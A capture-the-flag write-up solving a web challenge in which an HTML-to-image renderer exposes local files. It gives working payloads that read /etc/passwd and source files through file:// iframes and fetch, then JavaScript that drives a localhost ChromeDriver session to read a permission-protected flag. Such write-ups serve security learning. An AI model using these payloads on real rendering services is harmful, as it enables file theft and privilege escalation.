# Writeup: DeckForge

## Summary

DeckForge accepts attacker-controlled HTML and turns it into JPEG previews with a real Chromium browser. The important mistake is that the renderer runs with local file access enabled, and a runner-owned ChromeDriver helper is left listening on localhost. The public renderer user (`app`) cannot read the final flag directly, but the helper-owned browser can.

Final flag:

```text
BHFlagY{4c334128d0fca051b5b471bda92e4d69}
```

## Tools Used

- `curl`
- `unzip`
- Browser-rendered HTML/JavaScript payloads
- Chromium directory listings through `file://`
- Local ChromeDriver WebDriver API

## Step 1 - Confirm The Render Endpoint

The homepage JavaScript showed the API:

```js
fetch('/html-to-image', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({pages: [markup.value]})
})
```

Basic render test:

```bash
curl -sS -X POST 'http://k44232ef20f00c63c1cc3c92be1b529f5.playat.flagyard.com/html-to-image' \
  -H 'Content-Type: application/json' \
  --data-raw '{"pages":["<html><body><h1>test</h1></body></html>"]}' \
  -o /tmp/deckforge-test.zip

unzip -l /tmp/deckforge-test.zip
```

The server returned a ZIP containing `page_1.jpg`.

## Step 2 - Prove Local File Access

The README hinted that the browser runs with local resources enabled. Rendering an iframe to `/etc/passwd` confirmed the primitive:

```json
{
  "pages": [
    "<!doctype html><html><body><h1>file:///etc/passwd</h1><iframe src='file:///etc/passwd' style='width:100vw;height:85vh'></iframe></body></html>"
  ]
}
```

The screenshot showed `/etc/passwd`, including:

```text
app:x:1000:1000::/home/app:/bin/sh
runner:x:1001:1001::/home/runner:/bin/sh
```

JavaScript fetch also worked from the rendered file origin:

```html
<script>
fetch('file:///etc/passwd')
  .then(r => r.text())
  .then(t => out.textContent = t)
</script>
```

## Step 3 - Read The Application Source

Directory listing showed the app files:

```text
file:///app/
html_to_image.py
local-run
renderer_daemon.py
requirements.txt
run
server.py
supervisord.conf
```

Reading `file:///app/server.py` revealed:

- `POST /html-to-image` writes our submitted pages under `/bridge/deckforge-<uuid>/`
- it sends a job to `/bridge/renderer.sock`
- it zips whatever `*.jpg` files appear in the output directory

Reading `file:///app/html_to_image.py` revealed the renderer flags:

```text
--allow-file-access-from-files
--disable-web-security
--remote-debugging-pipe
```

This explains why our supplied HTML can read local files from the worker.

## Step 4 - Find The Protected Flag

Reading `file:///app/local-run` showed how the flag is created:

```sh
RAND=$(head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \n' | cut -c1-10)

if [ -n "${DYN_FLAG:-}" ]; then
  FLAG_VALUE="$DYN_FLAG"
else
  FLAG_VALUE="BHFlagY{deckforge_${RAND}}"
fi

install -d -o runner -g runner -m 0700 /runner
printf '%s' "$FLAG_VALUE" > "/runner/flag_${RAND}.txt"
chown runner:runner "/runner/flag_${RAND}.txt"
chmod 0400 /runner/flag_*.txt
```

Direct reads failed because the public renderer runs as `app`:

```text
file:///runner/flag
ERR TypeError: Failed to fetch
```

So the attack needs something running as `runner`.

## Step 5 - Find The Runner ChromeDriver Helper

`local-run` also starts a runner-owned ChromeDriver helper:

```sh
/usr/sbin/runuser -u runner -- env HOME=/home/runner USER=runner /usr/bin/chromedriver \
  --port="$HELPER_PORT" \
  --allowed-ips=127.0.0.1 \
  --allowed-origins='*'
```

The helper port is leaked through:

```text
file:///bridge/chromedriver.log
```

The successful instance showed:

```text
ChromeDriver was started successfully on port 38564.
```

From the renderer, localhost requests to that helper worked:

```js
GET http://127.0.0.1:38564/status
```

ChromeDriver returned status `200`.

## Step 6 - Create Or Reuse A Runner-Owned Browser Session

A full synchronous WebDriver session can exceed DeckForge's outer screenshot timeout, causing:

```json
{"error":"renderer produced no images"}
```

That failure can still leave a live runner-owned Chrome session behind. Querying `/sessions` through the renderer showed:

```text
/sessions
200 {"value":[{"capabilities":{...},"id":"13ab3e60e4cbf1d792777f26f34b9e1b"}]}
```

The important point: the session belongs to the runner-owned ChromeDriver, so browser operations can read `/runner`.

## Step 7 - Read The Flag Filename And Flag

The final payload attached to the existing runner session, navigated to `file:///runner/`, extracted `document.body.innerText`, found the randomized filename, then opened that file:

```js
let base = 'http://127.0.0.1:38564';
let sessions = JSON.parse(req('GET', base + '/sessions').text);
let sid = sessions.value[0].id || sessions.value[0].sessionId;

req('POST', base + '/session/' + sid + '/url',
  JSON.stringify({url: 'file:///runner/'}));

let dirText = JSON.parse(req('POST', base + '/session/' + sid + '/execute/sync',
  JSON.stringify({
    script: 'return document.body.innerText',
    args: []
  })).text).value;

let name = dirText.match(/flag_([^\s]+?)\.txt/)[0];

req('POST', base + '/session/' + sid + '/url',
  JSON.stringify({url: 'file:///runner/' + name}));

let flag = JSON.parse(req('POST', base + '/session/' + sid + '/execute/sync',
  JSON.stringify({
    script: 'return document.body.innerText',
    args: []
  })).text).value.trim();
```

The rendered output showed:

```text
dirText 200 {"value":"Index of /runner/\n[parent directory]\nName\tSize\tDate Modified\nflag_feb807186f.txt\t41 B\t9/5/26, 8:14:54 AM"}
FLAG=BHFlagY{4c334128d0fca051b5b471bda92e4d69}
flagUrl=file:///runner/flag_feb807186f.txt
flagRead 200 {"value":"BHFlagY{4c334128d0fca051b5b471bda92e4d69}"}
```

## Solve Files

The exact payloads used during the solve are in this directory:

- `probe-chromedriver-status.json`
- `exploit-runner-webdriver-read-v3.json`
- `exploit-existing-session-innertext.json`

The final successful extraction was `exploit-existing-session-innertext.json`.

## Common Mistakes

- Do not submit `BHFflag{...}`. My first visual read missed the exact casing. The real flag prefix is `BHFlagY`.
- Do not stop after proving `file:///etc/passwd`; the flag file is protected by Unix permissions.
- Do not brute force `/runner/flag_<RAND>.txt`; the random suffix is 10 hex characters.
- Be careful with ChromeDriver session creation. Bad Chrome options can crash the runner helper and require an instance reset.
- `renderer produced no images` is not always failure; it can mean the outer render timed out while a runner WebDriver session was still created.

## Lessons Learned

For browser-rendering web challenges, local file access is often only the first primitive. The real escalation here is crossing from the public renderer user into a nearby privileged helper. Leaving ChromeDriver reachable from attacker-rendered JavaScript, especially with permissive origins, lets the attacker control a browser running as another Unix user.

For creating a similar challenge, the nice design pattern is:

- public renderer can read harmless local files but not the final flag
- source files are readable enough to reveal the architecture
- a helper service is nearby and intentionally over-trusting
- the flag is protected by file permissions, forcing players to pivot through the helper's user context
- unstable or timeout-prone automation creates realistic debugging pressure without requiring guessing
